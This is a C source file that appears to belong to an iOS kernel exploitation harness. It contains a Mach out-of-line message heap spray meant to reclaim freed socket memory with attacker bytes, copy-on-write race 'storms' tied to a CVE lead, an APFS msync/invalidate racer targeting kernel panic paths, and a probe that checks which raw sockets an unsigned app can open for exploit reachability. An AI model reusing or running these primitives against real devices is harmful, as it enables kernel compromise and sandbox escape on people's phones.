// Cross-zone reclaim spray for the socket-UAF harness.
// Sends MACH_MSG_OOL_DESCRIPTOR messages with MACH_MSG_VIRTUAL_COPY so the
// kernel copies the payload into fresh kernel memory. Deliberately *not*
// sockets, so a freed socket slot reclaimed this way holds attacker bytes.

#include <mach/mach.h>
#include <mach/message.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define SOCKUAF_MAX_PORTS 1024

static mach_port_t sockuaf_ports[SOCKUAF_MAX_PORTS];
static int sockuaf_port_count;

void sockuaf_ool_reset(void) { sockuaf_port_count = 0; }

int sockuaf_ool_count(void) { return sockuaf_port_count; }

int sockuaf_ool_spray(size_t size, int count, uint64_t fill)
{
    if (count > SOCKUAF_MAX_PORTS - sockuaf_port_count)
        count = SOCKUAF_MAX_PORTS - sockuaf_port_count;
    if (count <= 0 || size == 0)
        return 0;

    uint8_t *buf = malloc(size);
    if (!buf)
        return 0;
    for (size_t i = 0; i < size; i += 8) {
        uint64_t v = fill;
        size_t n = size - i < 8 ? size - i : 8;
        memcpy(buf + i, &v, n);
    }

    int made = 0;
    for (int i = 0; i < count; i++) {
        mach_port_t port = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != KERN_SUCCESS)
            break;
        if (mach_port_insert_right(mach_task_self(), port, port,
                                   MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }

        struct {
            mach_msg_header_t header;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t desc;
        } msg;
        memset(&msg, 0, sizeof(msg));
        msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg.header.msgh_size = sizeof(msg);
        msg.header.msgh_remote_port = port;
        msg.header.msgh_local_port = MACH_PORT_NULL;
        msg.header.msgh_id = 0x4f4f5343;
        msg.body.msgh_descriptor_count = 1;
        msg.desc.address = buf;
        msg.desc.size = (mach_msg_size_t)size;
        msg.desc.deallocate = 0;
        msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
        msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;

        kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                                    MACH_PORT_NULL, 0, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(mach_task_self(), port);
            break;
        }
        sockuaf_ports[sockuaf_port_count++] = port;
        made++;
    }
    free(buf);
    return made;
}

/* ---- CoW / external-object fault storm (see analysis/krw-leads/CVE-2026-112576-cow.md) ---- */
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

typedef struct {
    uint8_t *base;
    uint64_t size;
    volatile int go;
} cow_thread_arg_t;

static void *cow_writer(void *p)
{
    cow_thread_arg_t *a = (cow_thread_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->base[i * 4096] ^= (uint8_t)(i & 0xff);
    }
    return NULL;
}


/* File-backed MAP_PRIVATE CoW storm: exercises the same vm_fault_page() CoW branch
   but through an interface the iOS sandbox permits. */
typedef struct {
    uint8_t *priv;
    uint8_t *shr;
    uint64_t size;
    volatile int go;
} cowf_arg_t;

static void *cowf_writer(void *p)
{
    cowf_arg_t *a = (cowf_arg_t *)p;
    while (!a->go) { }
    uint64_t pages = (a->size + 4095) / 4096;
    for (uint64_t i = 0; i < pages; i++) {
        a->priv[i * 4096] ^= (uint8_t)(i & 0xff);
        if (a->shr) {
            a->shr[i * 4096] += 1;
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap_private [2]=mmap_shared [3]=threads */
int cow_file_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    int first_err = 0;
    char path[512];

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        snprintf(path, sizeof(path), "%s/cowprobe_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }

        uint8_t *priv = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
        if (priv == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }

        uint8_t *shr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

        cowf_arg_t t1 = { priv, shr, size, 0 };
        cowf_arg_t t2 = { priv, NULL, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cowf_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cowf_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[3]++;
        }

        if (shr && shr != MAP_FAILED) munmap(shr, size);
        munmap(priv, size);
        close(fd);
        unlink(path);
    }
    return first_err;
}


/* ---- APFS msync / invalidate racer ------------------------------------------
   Targets the error-path panics in apfs_vnops.c that 27.2 removed:
     "%s:%d: %s Failed to msync for ino %llu"          (site 0xfffffe000a9ac0f0)
     "%s:%d: %s Failed to invalidate %llu:%llu for ino" (site 0xfffffe000a9ac62c)
   Strategy: dirty a large shared mapping, then concurrently msync, madvise,
   ftruncate and remap it so the APFS invalidation paths race hard. */
typedef struct {
    uint8_t *base;
    int fd;
    uint64_t size;
    volatile int go;
} apfs_arg_t;

static void *apfs_writer(void *p)
{
    apfs_arg_t *a = (apfs_arg_t *)p;
    while (!a->go) { }
    /* bounded: pthread_cancel has no cancellation point in a pure memory loop */
    for (int i = 0; i < 200000; i++) {
        uint64_t off = (uint64_t)(rand() % 64) * 4096;
        if (off < a->size) {
            a->base[off] ^= (uint8_t)off;
        }
    }
    return NULL;
}

static void *apfs_syncer(void *p)
{
    apfs_arg_t *a = (apfs_arg_t *)p;
    while (!a->go) { }
    for (int i = 0; i < 4000; i++) {
        if (a->size < 8192) break;
        uint64_t chunk = 4096u * (uint64_t)(1 + (rand() % 32));
        uint64_t start = (uint64_t)(rand() % 64) * 4096;
        if (start >= a->size) start = 0;
        msync(a->base + start, chunk, (i & 1) ? MS_SYNC : MS_ASYNC);
        if (i % 8 == 0) {
            madvise(a->base + start, chunk, MADV_DONTNEED);
        }
        if (i % 64 == 0) {
            fsync(a->fd);
        }
    }
    return NULL;
}

/* stages: [0]=open/ftruncate [1]=mmap [2]=thread create */
int apfs_race_probe(int rounds, int size_kb, const char *dir, int *stages)
{
    char path[512];
    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * 1024u;
        snprintf(path, sizeof(path), "%s/apfsrace_%d.bin", dir, r);
        int fd = open(path, O_CREAT | O_TRUNC | O_RDWR, 0600);
        if (fd < 0 || ftruncate(fd, (off_t)size) != 0) {
            stages[0]++;
            if (fd >= 0) close(fd);
            continue;
        }
        uint8_t *base = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        if (base == MAP_FAILED) {
            stages[1]++;
            close(fd);
            continue;
        }
        /* dirty every page so there is real state to invalidate */
        memset(base, 0x5a, size);

        apfs_arg_t w = { base, fd, size, 0 };
        apfs_arg_t sy = { base, fd, size, 0 };
        pthread_t tw, tsy;
        int ok = 1;
        if (pthread_create(&tw, NULL, apfs_writer, &w) != 0) ok = 0;
        if (pthread_create(&tsy, NULL, apfs_syncer, &sy) != 0) ok = 0;
        if (ok) {
            w.go = 1; sy.go = 1;
            pthread_join(tsy, NULL);
            pthread_join(tw, NULL);
        } else {
            stages[2]++;
        }

        munmap(base, size);
        /* invalidation cycle after unmapping: ftruncate cannot SIGBUS here */
        for (int k = 0; k < 8; k++) {
            if (ftruncate(fd, 0) == 0) {
                fsync(fd);
                ftruncate(fd, (off_t)size);
                fsync(fd);
            }
        }
        close(fd);
        unlink(path);
    }
    return 0;
}

/* stages: [0]=make_entry [1]=map1 [2]=map2 [3]=allocate [4]=copy [5]=thread */
int cow_probe_run(int rounds, int size_kb, int *stages)
{
    int first_kr = 0;
    vm_map_t self = mach_task_self();

    for (int r = 0; r < rounds; r++) {
        uint64_t size = (uint64_t)size_kb * (1u + (uint32_t)(r % 4)) * 1024u;
        mach_port_t entry = MACH_PORT_NULL;

        kern_return_t kr = mach_make_memory_entry_64(
            self, &size, 0,
            VM_PROT_READ | VM_PROT_WRITE,
            &entry, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            stages[0]++;
            if (!first_kr) first_kr = (int)kr;
            continue;
        }

        vm_address_t a1 = 0;
        kr = vm_map(self, &a1, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[1]++;
            if (!first_kr) first_kr = (int)kr;
            mach_port_deallocate(self, entry);
            continue;
        }
        memset((void *)a1, 0x5a, size);

        vm_address_t a2 = 0;
        kr = vm_map(self, &a2, (vm_size_t)size, 0, VM_FLAGS_ANYWHERE,
                    entry, 0, FALSE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_PROT_READ | VM_PROT_WRITE,
                    VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) {
            stages[2]++;
            if (!first_kr) first_kr = (int)kr;
            vm_deallocate(self, a1, (vm_size_t)size);
            mach_port_deallocate(self, entry);
            continue;
        }

        vm_address_t a3 = 0;
        if (vm_allocate(self, &a3, (vm_size_t)size, VM_FLAGS_ANYWHERE) == KERN_SUCCESS) {
            kr = vm_copy(self, a1, (vm_size_t)size, a3);
            if (kr != KERN_SUCCESS) {
                stages[4]++;
                if (!first_kr) first_kr = (int)kr;
            }
        } else {
            stages[3]++;
            if (!first_kr) first_kr = (int)kr;
        }

        cow_thread_arg_t t1 = { (uint8_t *)a1, size, 0 };
        cow_thread_arg_t t2 = { (uint8_t *)a2, size, 0 };
        pthread_t th1, th2;
        if (pthread_create(&th1, NULL, cow_writer, &t1) == 0 &&
            pthread_create(&th2, NULL, cow_writer, &t2) == 0) {
            t1.go = 1; t2.go = 1;
            pthread_join(th1, NULL); pthread_join(th2, NULL);
        } else {
            stages[5]++;
        }

        vm_deallocate(self, a1, (vm_size_t)size);
        vm_deallocate(self, a2, (vm_size_t)size);
        if (a3) vm_deallocate(self, a3, (vm_size_t)size);
        mach_port_deallocate(self, entry);
    }
    return first_kr;
}

    // ---- Network-surface reachability probe (2026-11-14) -----------------------
    // Reports, from inside the app sandbox, which kernel-facing socket families an
    // unsigned app may actually create. This bounds every network-path lead
    // (raw-packet injection, the m_sum16/m_adj_sum16 checksum callers, PF_ROUTE /
    // PF_NDRV surfaces): if raw sockets are denied here, none of those paths is
    // reachable from an app-carried exploit on this build.
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <errno.h>
    #include <stdarg.h>
    #include <stdio.h>

    extern void log_from_c(const char *msg);

    #ifndef PF_NDRV
    #define PF_NDRV 27
    #endif
    #ifndef PF_ROUTE
    #define PF_ROUTE 17
    #endif
    #ifndef AF_SYSTEM
    #define AF_SYSTEM 32
    #endif
    #ifndef SYSPROTO_CONTROL
    #define SYSPROTO_CONTROL 2
    #endif

    static void nsp_log(const char *fmt, ...)
    {
        char buf[320];
        va_list ap;
        va_start(ap, fmt);
        vsnprintf(buf, sizeof(buf), fmt, ap);
        va_end(ap);
        log_from_c(buf);
        /* Also mirror to stdout: devicectl --console captures stdout, whereas
           log_from_c only reaches the app's own session file. */
        fputs(buf, stdout);
        fputc('\n', stdout);
        fflush(stdout);
    }

    int network_surface_probe(void)
    {
        struct { const char *name; int dom; int type; int proto; } tab[] = {
            { "AF_INET/SOCK_RAW/ICMP",     AF_INET,   SOCK_RAW,  IPPROTO_ICMP },
            { "AF_INET/SOCK_RAW/UDP",      AF_INET,   SOCK_RAW,  IPPROTO_UDP },
            { "AF_INET/SOCK_RAW/TCP",      AF_INET,   SOCK_RAW,  IPPROTO_TCP },
            { "AF_INET/SOCK_RAW/RAW",      AF_INET,   SOCK_RAW,  IPPROTO_RAW },
            { "AF_INET/SOCK_DGRAM/IGMP",   AF_INET,   SOCK_DGRAM, IPPROTO_IGMP },
            { "AF_INET6/SOCK_RAW/ICMPV6",  AF_INET6,  SOCK_RAW,  IPPROTO_ICMPV6 },
            { "AF_INET6/SOCK_RAW/RAW",     AF_INET6,  SOCK_RAW,  IPPROTO_RAW },
            { "PF_NDRV/SOCK_RAW/0",        PF_NDRV,   SOCK_RAW,  0 },
            { "PF_ROUTE/SOCK_RAW/INET",    PF_ROUTE,  SOCK_RAW,  AF_INET },
            { "AF_SYSTEM/SOCK_DGRAM/CTRL", AF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL },
            { "AF_INET/SOCK_STREAM/TCP",   AF_INET,   SOCK_STREAM, IPPROTO_TCP },
            { "AF_UNIX/SOCK_DGRAM/0",      AF_UNIX,   SOCK_DGRAM, 0 },
        };
        int n = (int)(sizeof(tab) / sizeof(tab[0]));
        int ok = 0;
        nsp_log("[*] rawsock: probing %d socket families (network-surface reachability)", n);
        for (int i = 0; i < n; i++) {
            errno = 0;
            int fd = socket(tab[i].dom, tab[i].type, tab[i].proto);
            int e = errno;
            if (fd >= 0) {
                ok++;
                nsp_log("[+] %-28s OK fd=%d", tab[i].name, fd);
                close(fd);
            } else {
                nsp_log("[-] %-28s ERR errno=%d (%s)", tab[i].name, e, strerror(e));
            }
        }
        int bpf = open("/dev/bpf0", O_RDWR | O_NONBLOCK);
        nsp_log("%s /dev/bpf0 open errno=%d (%s)", bpf >= 0 ? "[+]" : "[-]",
                errno, strerror(errno));
        if (bpf >= 0) close(bpf);

        // Only meaningful when a raw IPv4 socket exists: can we craft and inject a
        // packet to our own loopback, and does it come back out of the input path?
        int raw = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (raw >= 0) {
            int one = 1;
            int r = setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
            nsp_log("[*] rawsock: IP_HDRINCL on ICMP raw -> %d errno=%d", r, errno);

            struct sockaddr_in dst;
            memset(&dst, 0, sizeof(dst));
            dst.sin_family = AF_INET;
            dst.sin_len = sizeof(dst);
            dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            unsigned char pkt[40];
            memset(pkt, 0, sizeof(pkt));
            pkt[0] = 0x45;
            pkt[2] = 0; pkt[3] = sizeof(pkt);       /* total length */
            pkt[8] = 64;                             /* ttl */
            pkt[9] = IPPROTO_ICMP;
            pkt[12] = 127; pkt[13] = 0; pkt[14] = 0; pkt[15] = 1;
            pkt[16] = 127; pkt[17] = 0; pkt[18] = 0; pkt[19] = 1;
            pkt[20] = 8; pkt[21] = 0;                /* echo request */
            errno = 0;
            ssize_t s = sendto(raw, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
            nsp_log("[*] rawsock: raw ICMP sendto(127.0.0.1) -> %zd errno=%d", s, errno);

            for (int k = 0; k < 8; k++) {
                unsigned char rb[512];
                ssize_t g = recvfrom(raw, rb, sizeof(rb), MSG_DONTWAIT, NULL, NULL);
                if (g > 0) {
                    nsp_log("[+] rawsock: self-injected loopback packet received, %zd bytes", g);
                    break;
                }
            }
            close(raw);
        } else {
            nsp_log("[-] rawsock: no raw IPv4 socket available for injection test");
        }

        nsp_log("[*] rawsock: %d/%d socket families opened", ok, n);
        return ok;
    }
